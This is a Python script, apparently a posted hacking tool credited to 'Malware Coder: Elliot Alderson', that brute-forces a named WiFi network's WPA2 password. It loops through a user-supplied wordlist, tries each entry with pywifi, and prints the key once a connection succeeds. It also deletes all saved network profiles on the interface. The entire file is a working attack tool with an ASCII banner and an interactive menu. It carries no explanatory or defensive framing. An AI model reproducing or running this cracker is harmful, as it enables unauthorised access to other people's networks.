##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################


import os
import time

def main(ssid, password):
    from pywifi import PyWiFi, const, Profile
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    
    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    
    iface.connect(tmp_profile)
    time.sleep(2)  # Allow more time for connection
    
    if iface.status() == const.IFACE_CONNECTED:
        print("[+] Password Found!")
        print("[+] Password is: " + password)
        return "Success"
    else:
        print("[-] Password Not Found! : " + password)

def pwd(ssid, file):
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            pwd = line.strip()  # Clean up the password
            result = main(ssid, pwd)
            if result == "Success":
                break

def menu():
    print("""
 __      ___  __ _   ___          _         ___               
 \ \    / (_)/ _(_) | _ )_ _ _  _| |_ ___  | __|__ _ _ __ ___ 
  \ \/\/ /| |  _| | | _ \ '_| || |  _/ -_) | _/ _ \ '_/ _/ -_)
   \_/\_/ |_|_| |_| |___/_|  \_,_|\__\___| |_|\___/_| \__\___|
<--------------------------------------------------------------->""")
    ssid = input("[*] SSID: ")  # WiFi name
    file = input("[*] Passwords File: ")  # File path containing passwords
    
    if os.path.exists(file):
        print("[~] Cracking...")
        pwd(ssid, file)
    else:
        print("[-] File Not Found!")

if __name__ == "__main__":
    menu()
    
